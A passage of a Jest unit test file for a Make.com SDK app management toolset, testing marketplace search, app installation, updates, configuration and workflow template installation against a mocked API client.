/**
 * Unit tests for SDK app management tools
 * Tests SDK app installation, configuration, updates, marketplace search, and workflow management
 */

import { jest, describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { UserError } from 'fastmcp';
import { MockMakeApiClient } from '../../mocks/make-api-client.mock.js';
import { 
  createMockServer, 
  findTool, 
  executeTool, 
  expectToolCall,
  expectProgressReported,
  expectValidZodParse,
  expectInvalidZodParse
} from '../../utils/test-helpers.js';

// Test data fixtures
const testSDKApp = {
  id: 1,
  name: 'Productivity Suite',
  description: 'Comprehensive productivity tools for automation',
  version: '2.1.0',
  publisher: 'Make.com',
  category: 'productivity',
  status: 'available',
  organizationId: 123,
  teamId: 456,
  installation: {
    installedAt: '2024-01-01T00:00:00Z',
    installedBy: 1,
    installedByName: 'John Doe',
    version: '2.1.0',
    autoUpdate: true,
    configuration: {
      apiKey: 'test-api-key',
      enableNotifications: true,
      maxConcurrency: 5
    },
    permissions: {
      granted: ['read_data', 'write_data'],
      requested: ['read_data', 'write_data', 'admin_access'],
      denied: ['admin_access']
    }
  },
  metadata: {
    homepage: 'https://productivity-suite.com',
    documentation: 'https://docs.productivity-suite.com',
    support: 'https://support.productivity-suite.com',
    repository: 'https://github.com/productivity/suite',
    license: 'MIT',
    tags: ['productivity', 'automation', 'workflow'],
    screenshots: ['screenshot1.png', 'screenshot2.png'],
    icon: 'icon.png'
  },
  requirements: {
    makeVersion: '>=2.0.0',
    dependencies: {
      'dependency-app': '>=1.0.0'
    },
    features: ['webhooks', 'api_access'],
    permissions: ['read_data', 'write_data']
  },
  usage: {
    installations: 1500,
    rating: 4.7,
    reviews: 320,
    activeUsers: 890,
    executions: 25000,
    lastUsed: '2024-01-01T00:00:00Z'
  },
  integration: {
    endpoints: [
      {
        name: 'create_task',
        method: 'POST',
        path: '/api/tasks',
        description: 'Create a new task'
      }
    ],
    webhooks: [
      {
        name: 'task_completed',
        events: ['task.completed'],
        endpoint: '/webhooks/task-completed'
      }
    ],
    triggers: [
      {
        name: 'New Task',
        description: 'Trigger when a new task is created',
        type: 'webhook'
      }
    ],
    actions: [
      {
        name: 'Create Task',
        description: 'Create a new task in the system',
        category: 'productivity'
      }
    ]
  },
  compatibility: {
    platforms: ['web', 'mobile'],
    regions: ['us', 'eu', 'asia'],
    languages: ['en', 'es', 'fr']
  },
  security: {
    verified: true,
    sandboxed: true,
    permissions: ['read_data', 'write_data'],
    dataAccess: 'read',
    networkAccess: true
  },
  createdAt: '2024-01-01T00:00:00Z',
  updatedAt: '2024-01-01T00:00:00Z',
  publishedAt: '2024-01-01T00:00:00Z'
};

const testWorkflowTemplate = {
  id: 1,
  name: 'Email Automation Workflow',
  description: 'Automate email responses and follow-ups',
  appId: 1,
  appName: 'Productivity Suite',
  version: '2.1.0',
  template: {
    flow: [
      {
        id: 1,
        app: 'email',
        operation: 'trigger',
        metadata: {
          type: 'new_email',
          filters: ['important']
        }
      },
      {
        id: 2,
        app: 'productivity-suite',
        operation: 'create_task',
        metadata: {
          title: '{{1.subject}}',
          description: '{{1.body}}',
          priority: 'high'
        }
      }
    ],
    settings: {
      errorHandling: 'continue',
      logging: 'full'
    }
  },
  category: 'starter',
  difficulty: 'beginner',
  tags: ['email', 'automation', 'productivity'],
  usage: {
    installs: 450,
    rating: 4.5,
    reviews: 89
  },
  requirements: {
    apps: [
      {
        name: 'Email Connector',
        version: '>=1.0.0',
        required: true
      }
    ],
    features: ['webhooks'],
    permissions: ['read_email', 'create_tasks']
  },
  documentation: {
    setup: 'Configure your email provider credentials',
    usage: 'Workflow will automatically create tasks from important emails',
    troubleshooting: 'Check email provider connection if tasks are not created'
  },
  createdAt: '2024-01-01T00:00:00Z',
  updatedAt: '2024-01-01T00:00:00Z',
  createdBy: 1
};

const testErrors = {
  appNotFound: { message: 'SDK app with ID 999 not found', code: 'APP_NOT_FOUND' },
  incompatibleApp: { message: 'App is not compatible: Version requirement not met', code: 'INCOMPATIBLE' },
  installationFailed: { message: 'Installation failed: Dependency not available', code: 'INSTALL_FAILED' },
  updateFailed: { message: 'Update failed: Breaking changes detected', code: 'UPDATE_FAILED' },
  networkError: { message: 'Network timeout', code: 'NETWORK_TIMEOUT' },
  authError: { message: 'Unauthorized access', code: 'UNAUTHORIZED' },
  rateLimitError: { message: 'Rate limit exceeded', code: 'RATE_LIMIT_EXCEEDED' }
};

describe('SDK App Management Tools - Comprehensive Test Suite', () => {
  let mockServer: any;
  let mockApiClient: MockMakeApiClient;
  let mockTool: jest.MockedFunction<any>;
  let mockLog: any;
  let mockReportProgress: jest.MockedFunction<any>;

  beforeEach(() => {
    const serverSetup = createMockServer();
    mockServer = serverSetup.server;
    mockTool = serverSetup.mockTool;
    mockApiClient = new MockMakeApiClient();

    mockLog = {
      info: jest.fn(),
      error: jest.fn(),
      warn: jest.fn(),
      debug: jest.fn(),
    };
    mockReportProgress = jest.fn();
  });

  afterEach(() => {
    jest.clearAllMocks();
    mockApiClient.reset();
  });

  describe('Tool Registration and Configuration', () => {
    it('should register all SDK management tools with correct configuration', async () => {
      const { addSDKTools } = await import('../../../src/tools/sdk.js');
      addSDKTools(mockServer, mockApiClient as any);
      
      const expectedTools = [
        'search-sdk-apps',
        'install-sdk-app', 
        'list-installed-apps',
        'update-sdk-app',
        'configure-sdk-app',
        'install-workflow'
      ];

      expectedTools.forEach(toolName => {
        const tool = findTool(mockTool, toolName);
        expect(tool).toBeDefined();
        expect(tool.name).toBe(toolName);
        expect(tool.description).toBeDefined();
        expect(typeof tool.execute).toBe('function');
        expect(tool.parameters).toBeInstanceOf(Object);
      });
    });
  });

  describe('SDK App Marketplace', () => {
    beforeEach(async () => {
      const { addSDKTools } = await import('../../../src/tools/sdk.js');
      addSDKTools(mockServer, mockApiClient as any);
    });

    describe('search-sdk-apps tool', () => {
      it('should search marketplace apps with default filters', async () => {
        const apps = [testSDKApp, { ...testSDKApp, id: 2, name: 'Integration Suite', category: 'integration' }];
        mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
          success: true,
          data: apps,
          metadata: { total: 2 }
        });

        const tool = findTool(mockTool, 'search-sdk-apps');
        const result = await executeTool(tool, {}, { log: mockLog });
        
        const parsed = JSON.parse(result);
        expect(parsed.apps).toHaveLength(2);
        expect(parsed.analysis.totalApps).toBe(2);
        expect(parsed.analysis.categoryBreakdown.productivity).toBe(1);
        expect(parsed.analysis.categoryBreakdown.integration).toBe(1);
        expect(parsed.analysis.verificationStatus.verified).toBe(2);
      });

      it('should filter apps by query and category', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
          success: true,
          data: [testSDKApp],
          metadata: { total: 1 }
        });

        const tool = findTool(mockTool, 'search-sdk-apps');
        await executeTool(tool, {
          query: 'productivity',
          category: 'productivity',
          publisher: 'Make.com',
          verified: true,
          rating: 4.0
        }, { log: mockLog });
        
        const calls = mockApiClient.getCallLog();
        expect(calls[0].params.q).toBe('productivity');
        expect(calls[0].params.category).toBe('productivity');
        expect(calls[0].params.publisher).toBe('Make.com');
        expect(calls[0].params.verified).toBe(true);
        expect(calls[0].params.minRating).toBe(4.0);
      });

      it('should filter by features and compatibility requirements', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
          success: true,
          data: [testSDKApp],
          metadata: { total: 1 }
        });

        const tool = findTool(mockTool, 'search-sdk-apps');
        await executeTool(tool, {
          features: ['webhooks', 'api_access'],
          compatibility: {
            platform: 'web',
            region: 'us',
            language: 'en'
          }
        }, { log: mockLog });
        
        const calls = mockApiClient.getCallLog();
        expect(calls[0].params.features).toBe('webhooks,api_access');
        expect(calls[0].params.platform).toBe('web');
        expect(calls[0].params.region).toBe('us');
        expect(calls[0].params.language).toBe('en');
      });

      it('should provide comprehensive marketplace analysis', async () => {
        const diverseApps = [
          { ...testSDKApp, category: 'productivity', usage: { ...testSDKApp.usage, rating: 4.8, installations: 2000 } },
          { ...testSDKApp, id: 2, category: 'integration', usage: { ...testSDKApp.usage, rating: 4.2, installations: 1500 }, security: { ...testSDKApp.security, verified: false } },
          { ...testSDKApp, id: 3, category: 'automation', usage: { ...testSDKApp.usage, rating: 3.8, installations: 800 }, publisher: 'Third Party' }
        ];
        mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
          success: true,
          data: diverseApps,
          metadata: { total: 3 }
        });

        const tool = findTool(mockTool, 'search-sdk-apps');
        const result = await executeTool(tool, {}, { log: mockLog });
        
        const parsed = JSON.parse(result);
        expect(parsed.analysis.ratingDistribution.excellent).toBe(2); // 4.5+ rating
        expect(parsed.analysis.ratingDistribution.good).toBe(1); // 3.5-4.5 rating
        expect(parsed.analysis.publisherBreakdown['Make.com']).toBe(2);
        expect(parsed.analysis.publisherBreakdown['Third Party']).toBe(1);
        expect(parsed.analysis.popularApps[0].installations).toBe(2000);
      });

      it('should handle pagination and sorting correctly', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
          success: true,
          data: [testSDKApp],
          metadata: { total: 50 }
        });

        const tool = findTool(mockTool, 'search-sdk-apps');
        const result = await executeTool(tool, {
          sortBy: 'installs',
          sortOrder: 'desc',
          limit: 10,
          offset: 20
        }, { log: mockLog });
        
        const parsed = JSON.parse(result);
        expect(parsed.pagination.total).toBe(50);
        expect(parsed.pagination.limit).toBe(10);
        expect(parsed.pagination.offset).toBe(20);
        expect(parsed.pagination.hasMore).toBe(true);
      });

      it('should limit screenshot data for performance', async () => {
        const appWithManyScreenshots = {
          ...testSDKApp,
          metadata: {
            ...testSDKApp.metadata,
            screenshots: ['s1.png', 's2.png', 's3.png', 's4.png', 's5.png']
          }
        };
        mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
          success: true,
          data: [appWithManyScreenshots],
          metadata: { total: 1 }
        });

        const tool = findTool(mockTool, 'search-sdk-apps');
        const result = await executeTool(tool, {}, { log: mockLog });
        
        const parsed = JSON.parse(result);
        expect(parsed.apps[0].metadata.screenshots).toHaveLength(3); // Limited to 3
      });
    });
  });

  describe('SDK App Installation', () => {
    beforeEach(async () => {
      const { addSDKTools } = await import('../../../src/tools/sdk.js');
      addSDKTools(mockServer, mockApiClient as any);
    });

    describe('install-sdk-app tool', () => {
      it('should install SDK app successfully with compatibility validation', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/1/compatibility', {
          success: true,
          data: { compatible: true, reasons: [] }
        });
        mockApiClient.mockResponse('POST', '/sdk-apps/install', {
          success: true,
          data: {
            id: 'install-123',
            appId: 1,
            appName: 'Productivity Suite',
            version: '2.1.0',
            installedAt: '2024-01-01T00:00:00Z',
            permissions: { granted: ['read_data', 'write_data'] },
            app: {
              metadata: {
                documentation: 'https://docs.productivity-suite.com',
                support: 'https://support.productivity-suite.com'
              }
            }
          }
        });

        const tool = findTool(mockTool, 'install-sdk-app');
        const result = await executeTool(tool, {
          appId: 1,
          configuration: {
            apiKey: 'test-key',
            enableNotifications: true
          },
          permissions: {
            autoGrant: false,
            restrictions: { admin_access: false }
          },
          autoUpdate: true
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const parsed = JSON.parse(result);
        expect(parsed.installation.appId).toBe(1);
        expect(parsed.summary.configurationApplied).toBe(true);
        expect(parsed.summary.permissionsGranted).toBe(2);
        expect(parsed.nextSteps).toHaveLength(4);
        
        expectProgressReported(mockReportProgress, [
          { progress: 0, total: 100 },
          { progress: 25, total: 100 },
          { progress: 50, total: 100 },
          { progress: 100, total: 100 }
        ]);
      });

      it('should install for specific organization', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/1/compatibility', {
          success: true,
          data: { compatible: true, reasons: [] }
        });
        mockApiClient.mockResponse('POST', '/organizations/123/sdk-apps/install', {
          success: true,
          data: { id: 'install-123', appId: 1, organizationId: 123 }
        });

        const tool = findTool(mockTool, 'install-sdk-app');
        await executeTool(tool, {
          appId: 1,
          organizationId: 123,
          configuration: {}
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const calls = mockApiClient.getCallLog();
        expect(calls[1].endpoint).toBe('/organizations/123/sdk-apps/install');
      });

      it('should install for specific team', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/1/compatibility', {
          success: true,
          data: { compatible: true, reasons: [] }
        });
        mockApiClient.mockResponse('POST', '/teams/456/sdk-apps/install', {
          success: true,
          data: { id: 'install-123', appId: 1, teamId: 456 }
        });

        const tool = findTool(mockTool, 'install-sdk-app');
        await executeTool(tool, {
          appId: 1,
          teamId: 456,
          configuration: {}
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const calls = mockApiClient.getCallLog();
        expect(calls[1].endpoint).toBe('/teams/456/sdk-apps/install');
      });

      it('should skip validation when requested', async () => {
        mockApiClient.mockResponse('POST', '/sdk-apps/install', {
          success: true,
          data: { id: 'install-123', appId: 1 }
        });

        const tool = findTool(mockTool, 'install-sdk-app');
        await executeTool(tool, {
          appId: 1,
          skipValidation: true,
          configuration: {}
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const calls = mockApiClient.getCallLog();
        expect(calls).toHaveLength(1); // No compatibility check
        expect(calls[0].endpoint).toBe('/sdk-apps/install');
      });

      it('should fail installation on incompatibility', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/1/compatibility', {
          success: true,
          data: { 
            compatible: false, 
            reasons: ['Version requirement not met', 'Missing required features'] 
          }
        });

        const tool = findTool(mockTool, 'install-sdk-app');
        await expect(executeTool(tool, {
          appId: 1,
          configuration: {}
        }, { log: mockLog, reportProgress: mockReportProgress }))
          .rejects.toThrow('App is not compatible: Version requirement not met, Missing required features');
      });

      it('should handle installation failures gracefully', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/1/compatibility', {
          success: true,
          data: { compatible: true, reasons: [] }
        });
        mockApiClient.mockResponse('POST', '/sdk-apps/install', {
          success: false,
          error: testErrors.installationFailed
        });

        const tool = findTool(mockTool, 'install-sdk-app');
        await expect(executeTool(tool, {
          appId: 1,
          configuration: {}
        }, { log: mockLog, reportProgress: mockReportProgress }))
          .rejects.toThrow('Failed to install SDK app: Installation failed: Dependency not available');
      });

      it('should validate input parameters correctly', async () => {
        const tool = findTool(mockTool, 'install-sdk-app');
        
        // Test invalid app ID
        await expect(executeTool(tool, {
          appId: 0,
          configuration: {}
        }, { log: mockLog }))
          .rejects.toThrow();

        // Test invalid organization ID
        await expect(executeTool(tool, {
          appId: 1,
          organizationId: 0,
          configuration: {}
        }, { log: mockLog }))
          .rejects.toThrow();
      });
    });

    describe('list-installed-apps tool', () => {
      it('should list installed apps with usage analytics', async () => {
        const installedApps = [
          testSDKApp,
          { ...testSDKApp, id: 2, name: 'Integration Suite', status: 'updating', installation: { ...testSDKApp.installation, autoUpdate: false } }
        ];
        mockApiClient.mockResponse('GET', '/sdk-apps/installed', {
          success: true,
          data: installedApps,
          metadata: { total: 2 }
        });

        const tool = findTool(mockTool, 'list-installed-apps');
        const result = await executeTool(tool, { includeUsage: true }, { log: mockLog });
        
        const parsed = JSON.parse(result);
        expect(parsed.apps).toHaveLength(2);
        expect(parsed.analysis.totalInstalled).toBe(2);
        expect(parsed.analysis.statusBreakdown.available).toBe(1);
        expect(parsed.analysis.statusBreakdown.updating).toBe(1);
        expect(parsed.analysis.updateStatus.autoUpdateEnabled).toBe(1);
        expect(parsed.analysis.usageSummary.totalExecutions).toBe(50000);
      });

      it('should filter by organization, team, and status', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/installed', {
          success: true,
          data: [testSDKApp],
          metadata: { total: 1 }
        });

        const tool = findTool(mockTool, 'list-installed-apps');
        await executeTool(tool, {
          organizationId: 123,
          teamId: 456,
          status: 'installed',
          category: 'productivity',
          includeConfiguration: true
        }, { log: mockLog });
        
        const calls = mockApiClient.getCallLog();
        expect(calls[0].params.organizationId).toBe(123);
        expect(calls[0].params.teamId).toBe(456);
        expect(calls[0].params.status).toBe('installed');
        expect(calls[0].params.category).toBe('productivity');
        expect(calls[0].params.includeConfiguration).toBe(true);
      });

      it('should hide configuration when not requested', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/installed', {
          success: true,
          data: [testSDKApp],
          metadata: { total: 1 }
        });

        const tool = findTool(mockTool, 'list-installed-apps');
        const result = await executeTool(tool, { includeConfiguration: false }, { log: mockLog });
        
        const parsed = JSON.parse(result);
        expect(parsed.apps[0].installation.configuration).toBe('[CONFIG_HIDDEN]');
      });

      it('should identify most used apps and outdated installations', async () => {
        const appsWithVariedUsage = [
          { ...testSDKApp, usage: { ...testSDKApp.usage, executions: 50000, lastUsed: '2024-01-01T00:00:00Z' }, installation: { ...testSDKApp.installation, version: '2.0.0' } },
          { ...testSDKApp, id: 2, usage: { ...testSDKApp.usage, executions: 75000, lastUsed: '2024-01-02T00:00:00Z' }, installation: { ...testSDKApp.installation, version: '2.1.0' } },
          { ...testSDKApp, id: 3, usage: { ...testSDKApp.usage, executions: 30000, lastUsed: '2023-12-01T00:00:00Z' }, installation: { ...testSDKApp.installation, version: '2.1.0' } }
        ];
        mockApiClient.mockResponse('GET', '/sdk-apps/installed', {
          success: true,
          data: appsWithVariedUsage,
          metadata: { total: 3 }
        });

        const tool = findTool(mockTool, 'list-installed-apps');
        const result = await executeTool(tool, { includeUsage: true }, { log: mockLog });
        
        const parsed = JSON.parse(result);
        expect(parsed.analysis.updateStatus.outdatedApps).toBe(1); // Version 2.0.0 vs 2.1.0
        expect(parsed.analysis.usageSummary.mostUsedApps[0].executions).toBe(75000);
        expect(parsed.analysis.usageSummary.activeApps).toBe(2); // Used within 30 days
      });

      it('should handle pagination and sorting', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/installed', {
          success: true,
          data: [testSDKApp],
          metadata: { total: 25 }
        });

        const tool = findTool(mockTool, 'list-installed-apps');
        const result = await executeTool(tool, {
          sortBy: 'lastUsed',
          sortOrder: 'desc',
          limit: 10,
          offset: 10
        }, { log: mockLog });
        
        const parsed = JSON.parse(result);
        expect(parsed.pagination.total).toBe(25);
        expect(parsed.pagination.hasMore).toBe(true);
      });
    });
  });

  describe('SDK App Updates and Configuration', () => {
    beforeEach(async () => {
      const { addSDKTools } = await import('../../../src/tools/sdk.js');
      addSDKTools(mockServer, mockApiClient as any);
    });

    describe('update-sdk-app tool', () => {
      it('should update SDK app successfully with backup', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/1/installation', {
          success: true,
          data: { version: '2.0.0', appId: 1 }
        });
        mockApiClient.mockResponse('POST', '/sdk-apps/1/update', {
          success: true,
          data: {
            success: true,
            appName: 'Productivity Suite',
            version: '2.1.0',
            updatedAt: '2024-01-01T00:00:00Z',
            breaking: false,
            backupId: 'backup-123',
            changelog: {
              features: ['New dashboard', 'Improved performance'],
              bugfixes: ['Fixed memory leak', 'Corrected timezone handling'],
              breaking: [],
              deprecated: ['Old API endpoint']
            },
            configurationMigrated: true,
            permissionsChanged: false,
            requiresTesting: false,
            rollbackAvailable: true
          }
        });

        const tool = findTool(mockTool, 'update-sdk-app');
        const result = await executeTool(tool, {
          appId: 1,
          version: '2.1.0',
          backup: true,
          rollbackOnFailure: true
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const parsed = JSON.parse(result);
        expect(parsed.summary.fromVersion).toBe('2.0.0');
        expect(parsed.summary.toVersion).toBe('2.1.0');
        expect(parsed.summary.backupCreated).toBe('backup-123');
        expect(parsed.changes.features).toHaveLength(2);
        expect(parsed.postUpdate.configurationMigrated).toBe(true);
        
        expectProgressReported(mockReportProgress, [
          { progress: 0, total: 100 },
          { progress: 20, total: 100 },
          { progress: 40, total: 100 },
          { progress: 100, total: 100 }
        ]);
      });

      it('should handle force updates for breaking changes', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/1/installation', {
          success: true,
          data: { version: '1.9.0', appId: 1 }
        });
        mockApiClient.mockResponse('POST', '/sdk-apps/1/update', {
          success: true,
          data: {
            success: true,
            version: '2.0.0',
            breaking: true,
            changelog: {
              breaking: ['API endpoint changed', 'Configuration format updated']
            }
          }
        });

        const tool = findTool(mockTool, 'update-sdk-app');
        const result = await executeTool(tool, {
          appId: 1,
          force: true
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const parsed = JSON.parse(result);
        expect(parsed.summary.breaking).toBe(true);
        expect(parsed.changes.breaking).toHaveLength(2);
      });

      it('should update to latest version when version not specified', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/1/installation', {
          success: true,
          data: { version: '2.0.0', appId: 1 }
        });
        mockApiClient.mockResponse('POST', '/sdk-apps/1/update', {
          success: true,
          data: { success: true, version: '2.2.0' }
        });

        const tool = findTool(mockTool, 'update-sdk-app');
        await executeTool(tool, { appId: 1 }, { log: mockLog, reportProgress: mockReportProgress });
        
        const calls = mockApiClient.getCallLog();
        expect(calls[1].data.targetVersion).toBe('latest');
      });

      it('should handle update failures', async () => {
        mockApiClient.mockResponse('GET', '/sdk-apps/1/installation', {
          success: true,
          data: { version: '2.0.0', appId: 1 }
        });
        mockApiClient.mockResponse('POST', '/sdk-apps/1/update', {
          success: false,
          error: testErrors.updateFailed
        });

        const tool = findTool(mockTool, 'update-sdk-app');
        await expect(executeTool(tool, { appId: 1 }, { log: mockLog, reportProgress: mockReportProgress }))
          .rejects.toThrow('Failed to update SDK app: Update failed: Breaking changes detected');
      });
    });

    describe('configure-sdk-app tool', () => {
      it('should configure SDK app settings successfully', async () => {
        mockApiClient.mockResponse('PUT', '/sdk-apps/1/configure', {
          success: true,
          data: {
            appName: 'Productivity Suite',
            configurationApplied: true,
            permissionsChanged: true,
            integrationsUpdated: true,
            validation: {
              valid: true,
              errors: [],
              warnings: ['Deprecated setting used']
            }
          }
        });

        const tool = findTool(mockTool, 'configure-sdk-app');
        const result = await executeTool(tool, {
          appId: 1,
          configuration: {
            apiKey: 'new-api-key',
            maxConcurrency: 10,
            enableNotifications: false
          },
          permissions: {
            grant: ['admin_access'],
            revoke: ['debug_access']
          },
          integrations: {
            enable: ['webhook_integration'],
            disable: ['polling_integration'],
            configure: {
              webhook_timeout: 30000
            }
          }
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const parsed = JSON.parse(result);
        expect(parsed.summary.configurationKeys).toBe(3);
        expect(parsed.summary.permissionsGranted).toBe(1);
        expect(parsed.summary.permissionsRevoked).toBe(1);
        expect(parsed.summary.integrationsEnabled).toBe(1);
        expect(parsed.applied.configuration).toBe(true);
        expect(parsed.validation.warnings).toHaveLength(1);
        
        expectProgressReported(mockReportProgress, [
          { progress: 0, total: 100 },
          { progress: 50, total: 100 },
          { progress: 100, total: 100 }
        ]);
      });

      it('should handle configuration validation errors', async () => {
        mockApiClient.mockResponse('PUT', '/sdk-apps/1/configure', {
          success: true,
          data: {
            configurationApplied: false,
            validation: {
              valid: false,
              errors: ['Invalid API key format', 'Missing required setting'],
              warnings: []
            }
          }
        });

        const tool = findTool(mockTool, 'configure-sdk-app');
        const result = await executeTool(tool, {
          appId: 1,
          configuration: {
            apiKey: 'invalid-format',
            missingRequired: undefined
          }
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const parsed = JSON.parse(result);
        expect(parsed.applied.configuration).toBe(false);
        expect(parsed.validation.valid).toBe(false);
        expect(parsed.validation.errors).toHaveLength(2);
      });

      it('should configure permissions only', async () => {
        mockApiClient.mockResponse('PUT', '/sdk-apps/1/configure', {
          success: true,
          data: {
            permissionsChanged: true,
            configurationApplied: false,
            integrationsUpdated: false,
            validation: { valid: true, errors: [], warnings: [] }
          }
        });

        const tool = findTool(mockTool, 'configure-sdk-app');
        const result = await executeTool(tool, {
          appId: 1,
          configuration: {},
          permissions: {
            grant: ['read_advanced', 'write_advanced'],
            revoke: ['admin_access']
          }
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const parsed = JSON.parse(result);
        expect(parsed.summary.permissionsGranted).toBe(2);
        expect(parsed.summary.permissionsRevoked).toBe(1);
        expect(parsed.applied.permissions).toBe(true);
      });

      it('should handle configuration failures', async () => {
        mockApiClient.mockResponse('PUT', '/sdk-apps/1/configure', {
          success: false,
          error: { message: 'Configuration failed', code: 'CONFIG_ERROR' }
        });

        const tool = findTool(mockTool, 'configure-sdk-app');
        await expect(executeTool(tool, {
          appId: 1,
          configuration: { invalid: 'value' }
        }, { log: mockLog, reportProgress: mockReportProgress }))
          .rejects.toThrow('Failed to configure SDK app: Configuration failed');
      });
    });
  });

  describe('Workflow Template Management', () => {
    beforeEach(async () => {
      const { addSDKTools } = await import('../../../src/tools/sdk.js');
      addSDKTools(mockServer, mockApiClient as any);
    });

    describe('install-workflow tool', () => {
      it('should install workflow template successfully', async () => {
        mockApiClient.mockResponse('GET', '/workflows/templates/1', {
          success: true,
          data: testWorkflowTemplate
        });
        mockApiClient.mockResponse('POST', '/workflows/install', {
          success: true,
          data: {
            scenarioId: 'scenario-123',
            name: 'My Email Automation',
            dependenciesInstalled: 1,
            installedDependencies: [{ name: 'Email Connector', version: '1.2.0' }],
            missingDependencies: [],
            started: true
          }
        });

        const tool = findTool(mockTool, 'install-workflow');
        const result = await executeTool(tool, {
          workflowId: 1,
          name: 'My Email Automation',
          teamId: 456,
          folderId: 789,
          configuration: {
            emailProvider: 'gmail',
            taskPriority: 'medium'
          },
          autoStart: true,
          installDependencies: true
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const parsed = JSON.parse(result);
        expect(parsed.summary.scenarioId).toBe('scenario-123');
        expect(parsed.summary.templateName).toBe('Email Automation Workflow');
        expect(parsed.summary.dependenciesInstalled).toBe(1);
        expect(parsed.summary.autoStarted).toBe(true);
        expect(parsed.dependencies.missing).toHaveLength(0);
        expect(parsed.nextSteps).toHaveLength(4);
        
        expectProgressReported(mockReportProgress, [
          { progress: 0, total: 100 },
          { progress: 25, total: 100 },
          { progress: 50, total: 100 },
          { progress: 100, total: 100 }
        ]);
      });

      it('should merge custom configuration with template defaults', async () => {
        const templateWithDefaults = {
          ...testWorkflowTemplate,
          defaultConfiguration: {
            emailProvider: 'outlook',
            taskPriority: 'high',
            autoArchive: true
          }
        };
        mockApiClient.mockResponse('GET', '/workflows/templates/1', {
          success: true,
          data: templateWithDefaults
        });
        mockApiClient.mockResponse('POST', '/workflows/install', {
          success: true,
          data: { scenarioId: 'scenario-123' }
        });

        const tool = findTool(mockTool, 'install-workflow');
        await executeTool(tool, {
          workflowId: 1,
          name: 'Custom Workflow',
          configuration: {
            emailProvider: 'gmail', // Override default
            customSetting: 'value'   // Add new setting
          }
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const calls = mockApiClient.getCallLog();
        const installCall = calls[1];
        expect(installCall.data.configuration.emailProvider).toBe('gmail'); // Overridden
        expect(installCall.data.configuration.taskPriority).toBe('high'); // From template
        expect(installCall.data.configuration.autoArchive).toBe(true); // From template
        expect(installCall.data.configuration.customSetting).toBe('value'); // Custom
      });

      it('should handle missing workflow template', async () => {
        mockApiClient.mockResponse('GET', '/workflows/templates/999', {
          success: false,
          error: { message: 'Workflow template not found', code: 'TEMPLATE_NOT_FOUND' }
        });

        const tool = findTool(mockTool, 'install-workflow');
        await expect(executeTool(tool, {
          workflowId: 999,
          name: 'Test Workflow'
        }, { log: mockLog, reportProgress: mockReportProgress }))
          .rejects.toThrow('Failed to get workflow template: Workflow template not found');
      });

      it('should install with missing dependencies', async () => {
        mockApiClient.mockResponse('GET', '/workflows/templates/1', {
          success: true,
          data: testWorkflowTemplate
        });
        mockApiClient.mockResponse('POST', '/workflows/install', {
          success: true,
          data: {
            scenarioId: 'scenario-123',
            dependenciesInstalled: 0,
            installedDependencies: [],
            missingDependencies: [{ name: 'Email Connector', reason: 'Not available in marketplace' }],
            started: false
          }
        });

        const tool = findTool(mockTool, 'install-workflow');
        const result = await executeTool(tool, {
          workflowId: 1,
          name: 'Incomplete Workflow',
          installDependencies: true
        }, { log: mockLog, reportProgress: mockReportProgress });
        
        const parsed = JSON.parse(result);
        expect(parsed.dependencies.missing).toHaveLength(1);
        expect(parsed.summary.autoStarted).toBe(false);
      });

      it('should handle workflow installation failure', async () => {
        mockApiClient.mockResponse('GET', '/workflows/templates/1', {
          success: true,
          data: testWorkflowTemplate
        });
        mockApiClient.mockResponse('POST', '/workflows/install', {
          success: false,
          error: { message: 'Installation failed', code: 'INSTALL_ERROR' }
        });

        const tool = findTool(mockTool, 'install-workflow');
        await expect(executeTool(tool, {
          workflowId: 1,
          name: 'Failed Workflow'
        }, { log: mockLog, reportProgress: mockReportProgress }))
          .rejects.toThrow('Failed to install workflow: Installation failed');
      });

      it('should validate input parameters', async () => {
        const tool = findTool(mockTool, 'install-workflow');
        
        // Test invalid workflow ID
        await expect(executeTool(tool, {
          workflowId: 0,
          name: 'Test'
        }, { log: mockLog }))
          .rejects.toThrow();

        // Test empty name
        await expect(executeTool(tool, {
          workflowId: 1,
          name: ''
        }, { log: mockLog }))
          .rejects.toThrow();

        // Test invalid team ID
        await expect(executeTool(tool, {
          workflowId: 1,
          name: 'Test',
          teamId: 0
        }, { log: mockLog }))
          .rejects.toThrow();
      });
    });
  });

  describe('Error Handling and Edge Cases', () => {
    beforeEach(async () => {
      const { addSDKTools } = await import('../../../src/tools/sdk.js');
      addSDKTools(mockServer, mockApiClient as any);
    });

    it('should handle API errors gracefully across all tools', async () => {
      const tools = [
        { name: 'search-sdk-apps', input: {} },
        { name: 'list-installed-apps', input: {} },
        { name: 'install-sdk-app', input: { appId: 1, configuration: {} } },
        { name: 'update-sdk-app', input: { appId: 1 } },
        { name: 'configure-sdk-app', input: { appId: 1, configuration: {} } },
        { name: 'install-workflow', input: { workflowId: 1, name: 'Test' } }
      ];
      
      for (const { name: toolName, input } of tools) {
        mockApiClient.mockResponse('GET', '/*', {
          success: false,
          error: testErrors.networkError
        });
